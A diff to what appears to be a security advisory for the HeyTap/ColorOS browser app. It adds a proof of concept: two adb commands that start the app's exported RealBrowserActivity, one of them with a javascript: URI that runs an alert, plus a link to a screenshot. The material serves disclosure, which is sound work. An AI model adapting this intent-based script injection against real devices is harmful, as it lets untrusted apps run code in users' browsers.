@@ -43,6 +43,17 @@ This vulnerability is particularly concerning because:
     }
 ```
 
+```
+adb shell am start -a android.intent.action.VIEW -d "http://example.com" -n com.heytap.browser/com.android.browser.RealBrowserActivity
+
+adb shell am start -a android.intent.action.VIEW -d "javascript:alert%28%27Test%20Alert%27%29%3B" -n com.heytap.browser/com.android.browser.RealBrowserActivity
+
+```
+
+![poc-coloros](https://github.com/actuator/com.heytap.browser/assets/78701239/952f08c7-b8d6-4982-80bb-28b693b20134)
+
+
+
 
 ### Impact:
 
